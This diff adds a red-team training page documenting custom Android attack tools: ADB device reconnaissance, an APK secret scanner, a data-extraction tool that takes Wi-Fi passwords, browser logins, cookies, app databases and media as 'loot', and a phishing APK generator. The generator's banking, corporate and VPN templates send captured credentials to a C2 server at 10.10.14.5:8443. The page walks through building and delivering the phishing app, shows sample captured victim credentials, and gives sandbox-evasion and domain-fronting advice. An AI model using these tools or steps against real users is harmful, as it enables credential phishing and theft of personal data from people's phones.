@@ -1,0 +1,307 @@
+---
+layout: training-page
+title: "Android Red Team Tools — Red Team Academy"
+module: "Tool Development"
+tags:
+  - android
+  - python
+  - custom-tools
+  - adb
+  - apk
+page_key: "tooldev-android-red-team-tools"
+---
+<h1>Android Red Team Tools</h1>
+<p>Custom Python tools built for Android red team engagements. These tools automate device reconnaissance, APK security analysis, data exfiltration, and phishing payload generation. All tools are in <code>scripts/rta-android-tools/</code>.</p>
+
+<h2>android-recon.py — Device Reconnaissance</h2>
+<p>Automated reconnaissance of a connected Android device via ADB. Extracts device information, installed apps, accounts, network config, and identifies attack surface including debuggable apps, backup-enabled apps, and root status.</p>
+
+<h3>Usage</h3>
+<pre><code># Basic scan — outputs JSON + text report
+python3 scripts/rta-android-tools/android-recon.py
+
+# Target a specific device
+python3 scripts/rta-android-tools/android-recon.py --device SERIALNUM
+
+# Custom output directory
+python3 scripts/rta-android-tools/android-recon.py --output ./recon_results/
+
+# Quick scan (skip slow exported component enum)
+python3 scripts/rta-android-tools/android-recon.py --quick</code></pre>
+
+<h3>What It Collects</h3>
+<pre><code># Device Information:
+# - Model, manufacturer, Android version, SDK level
+# - Security patch level, kernel version
+# - SELinux enforcement status
+# - Root binary presence
+# - ADB over network status
+# - Encryption state
+
+# App Analysis:
+# - All third-party installed apps
+# - Apps with android:debuggable=true (CRITICAL finding)
+# - Apps with android:allowBackup=true (data extractable)
+
+# Network:
+# - Interface configuration, routes, DNS
+# - ARP table (nearby devices on same network)
+# - Active connections
+# - Wi-Fi SSID
+
+# Accounts:
+# - Google, Exchange, social media accounts on device
+
+# Files:
+# - Camera photos, downloads, documents (count)</code></pre>
+
+<h3>Output</h3>
+<pre><code># Generates two reports:
+# android_recon/android_recon_20260411_143022.txt  — human-readable
+# android_recon/android_recon_20260411_143022.json — machine-parseable
+
+# Example attack surface summary:
+# [CRITICAL] Device is rooted — full access possible
+# [CRITICAL] SELinux is Permissive — no mandatory access control
+# [HIGH] ADB over network enabled on port 5555
+# [HIGH] 3 debuggable apps found
+# [MEDIUM] 12 apps allow backup extraction</code></pre>
+
+<h2>apk-extractor.py — APK Security Scanner</h2>
+<p>Comprehensive APK analysis pipeline: decompiles with apktool and jadx, scans for 20+ secret patterns (AWS keys, API keys, tokens, passwords), and checks for common Android vulnerabilities (debuggable, WebView misconfig, SQL injection, weak crypto).</p>
+
+<h3>Usage</h3>
+<pre><code># Scan a local APK file
+python3 scripts/rta-android-tools/apk-extractor.py target.apk
+
+# Pull APK from device and scan
+python3 scripts/rta-android-tools/apk-extractor.py --pull com.target.app
+
+# Custom output directory
+python3 scripts/rta-android-tools/apk-extractor.py target.apk --output ./scan_results/
+
+# Secrets-only scan (skip decompilation if already done)
+python3 scripts/rta-android-tools/apk-extractor.py target.apk --secrets-only</code></pre>
+
+<h3>Secret Patterns Detected</h3>
+<pre><code># Cloud &amp; API:
+# - AWS Access Keys (AKIA...)
+# - Google API Keys (AIza...)
+# - Firebase URLs and configs
+# - Stripe keys (sk_live_, pk_live_)
+# - SendGrid, Mailgun, Twilio tokens
+
+# Authentication:
+# - GitHub tokens (ghp_, gho_, ghs_)
+# - Slack tokens (xoxb-, xoxp-)
+# - JWT tokens
+# - Bearer tokens
+# - Basic auth credentials
+# - Hardcoded passwords
+
+# Crypto:
+# - Private keys (RSA, EC, DSA)
+# - Hardcoded encryption keys
+
+# Infrastructure:
+# - Internal IP addresses (10.x, 172.16-31.x, 192.168.x)
+# - Internal/staging URLs (.internal, .corp, .dev, .staging)</code></pre>
+
+<h3>Vulnerability Checks</h3>
+<pre><code># Manifest Issues:
+# - android:debuggable="true"
+# - android:allowBackup="true"
+# - android:usesCleartextTraffic="true"
+# - Exported components
+# - Custom URL schemes
+
+# WebView:
+# - JavaScript enabled
+# - File access enabled
+# - Universal file access from file URLs
+# - JavaScript interface bridges
+
+# Code Quality:
+# - Raw SQL queries (injection risk)
+# - Runtime.exec() calls (command injection)
+# - Sensitive data in logs
+# - Hardcoded crypto keys
+# - Weak crypto (DES, RC4, MD5, ECB mode)
+# - World-readable/writable file modes
+# - Clipboard usage (data leakage)</code></pre>
+
+<h2>android-data-exfil.py — Data Extraction</h2>
+<p>Automated extraction of credentials, databases, shared preferences, media files, Wi-Fi passwords, and browser data from a connected Android device. Requires root for full extraction; limited extraction available without root.</p>
+
+<h3>Usage</h3>
+<pre><code># Extract everything from a specific app
+python3 scripts/rta-android-tools/android-data-exfil.py --target com.target.app
+
+# Extract from all third-party apps
+python3 scripts/rta-android-tools/android-data-exfil.py --all
+
+# Extract everything possible (apps + wifi + browser + media)
+python3 scripts/rta-android-tools/android-data-exfil.py --everything
+
+# Selective extraction
+python3 scripts/rta-android-tools/android-data-exfil.py --wifi --browser
+python3 scripts/rta-android-tools/android-data-exfil.py --all --media
+
+# Custom output
+python3 scripts/rta-android-tools/android-data-exfil.py --everything -o ./loot/</code></pre>
+
+<h3>What It Extracts</h3>
+<pre><code># Per-App Data (requires root):
+# - SharedPreferences XML files (tokens, session data, configs)
+# - SQLite databases (analyzed for credential tables)
+# - Auto-identifies interesting tables: users, tokens, sessions, etc.
+
+# Wi-Fi Passwords:
+# - Saved network SSIDs and PSK passwords
+# - Parses WifiConfigStore.xml and wpa_supplicant.conf
+
+# Browser Data:
+# - Chrome: Login Data, Cookies, History, Web Data
+# - Firefox: logins.json, cookies.sqlite, places.sqlite
+
+# Media Files:
+# - Camera photos/videos
+# - Screenshots
+# - Downloads
+# - Documents
+# - WhatsApp media
+
+# Other:
+# - Current clipboard contents
+# - Categorized loot report (JSON + text)</code></pre>
+
+<h3>Database Analysis</h3>
+<pre><code># The tool automatically inspects extracted SQLite databases for tables
+# containing sensitive data. It looks for tables with names matching:
+# user, account, login, credential, auth, token, session,
+# password, key, secret, cookie, config, setting, preference
+
+# For each matching table, it extracts:
+# - Table schema (columns and types)
+# - Row count
+# - Sample data (first 5 rows)
+
+# Example output:
+# Package: com.target.banking
+#   Table: user_credentials (12 rows)
+#     Columns: id, username, encrypted_password, token, last_login
+#     Sample: {"id": 1, "username": "admin", "token": "eyJ..."}</code></pre>
+
+<h2>android-phish-apk.py — Phishing Payload Generator</h2>
+<p>Generates a complete Android phishing APK project with credential capture and C2 callback. Includes the implant source, buildozer configuration, and a C2 receiver script. Supports multiple templates for different social engineering scenarios.</p>
+
+<h3>Usage</h3>
+<pre><code># Generate a banking login phishing APK
+python3 scripts/rta-android-tools/android-phish-apk.py \
+    --template banking --c2 10.10.14.5:8443
+
+# Corporate SSO phishing
+python3 scripts/rta-android-tools/android-phish-apk.py \
+    --template corporate --c2 10.10.14.5:8443
+
+# VPN login capture (with OTP field)
+python3 scripts/rta-android-tools/android-phish-apk.py \
+    --template vpn --c2 10.10.14.5:8443 --output ./vpn_phish/
+
+# Available templates:
+# banking    — Account Number, Password, PIN
+# corporate  — Email, Password (SSO style)
+# social     — Username/Email, Password
+# email      — Email Address, Password
+# vpn        — Username, Password, OTP Token</code></pre>
+
+<h3>Build Process</h3>
+<pre><code># 1. Generate the project files
+python3 android-phish-apk.py --template banking --c2 10.10.14.5:8443
+
+# 2. Install build dependencies
+pip install buildozer cython
+
+# 3. Build the APK
+cd phish_apk/
+buildozer android debug
+# Output: bin/securebanking-1.0.0-arm64-v8a-debug.apk
+
+# 4. Start the C2 receiver on your machine
+python3 c2_receiver.py
+# [*] Phishing C2 Receiver listening on 0.0.0.0:8443
+# [*] Waiting for connections...
+
+# 5. Deliver the APK (phishing email, QR code, USB drop, etc.)
+
+# 6. When victim enters credentials:
+# [+] CREDENTIALS CAPTURED from 192.168.1.50
+#     Time: 2026-04-11T14:30:22
+#     Template: Secure Banking
+#     Device: {"model": "Pixel 8", "manufacturer": "Google"}
+#     account_number: 1234567890
+#     password: MyP@ssw0rd
+#     pin: 5678</code></pre>
+
+<h3>Architecture</h3>
+<pre><code># Generated project structure:
+# phish_apk/
+# ├── main.py           — Kivy app with login UI + C2 callback
+# ├── buildozer.spec    — Build config (package name, permissions, arch)
+# └── c2_receiver.py    — Credential logging server
+
+# Features:
+# - Native Android look with Kivy framework
+# - Credentials sent to C2 over raw TCP socket
+# - Device fingerprint included (model, OS version)
+# - Graceful UI — shows "success" message then closes
+# - Minimal permissions (INTERNET only)
+# - No suspicious permission prompts for the victim
+
+# OPSEC notes:
+# - Change package name in buildozer.spec to match target context
+# - Use HTTPS for C2 in production (wrap socket with SSL)
+# - Add certificate pinning to prevent MITM of the C2 channel
+# - Delay C2 callback to evade sandbox analysis
+# - Use domain fronting for C2 if network is monitored</code></pre>
+
+<h2>Tool Pipeline — Full Engagement Workflow</h2>
+<pre><code># Phase 1: Reconnaissance
+python3 android-recon.py --output ./engagement/recon/
+# Identify target apps, security posture, network position
+
+# Phase 2: APK Analysis (for target apps)
+python3 apk-extractor.py --pull com.target.app --output ./engagement/apk_scan/
+# Find secrets, vulns, attack surface in target app
+
+# Phase 3: Initial Access (choose one)
+# Option A: Phishing APK
+python3 android-phish-apk.py --template corporate --c2 10.10.14.5:8443
+# Build, deliver, capture credentials
+
+# Option B: Exploit vulnerable app (from Phase 2 findings)
+# Use drozer, ADB, or Frida to exploit exported components
+
+# Option C: Physical access
+adb install payload.apk  # if device is unlocked with USB debug on
+
+# Phase 4: Post-Exploitation
+python3 android-data-exfil.py --everything --output ./engagement/loot/
+# Extract all available data
+
+# Phase 5: Reporting
+# Combine reports from all tools into engagement deliverable
+cat ./engagement/recon/android_recon_*.txt
+cat ./engagement/apk_scan/apk_scan_*.txt
+cat ./engagement/loot/loot_report_*.txt</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>Frida — <code>frida.re</code></li>
+  <li>Drozer — <code>github.com/WithSecureLabs/drozer</code></li>
+  <li>MobSF — <code>github.com/MobSF/Mobile-Security-Framework-MobSF</code></li>
+  <li>Buildozer — <code>github.com/kivy/buildozer</code></li>
+  <li>jadx — <code>github.com/skylot/jadx</code></li>
+  <li>apktool — <code>apktool.org</code></li>
+  <li>OWASP MASTG — <code>mas.owasp.org/MASTG/</code></li>
+</ul>
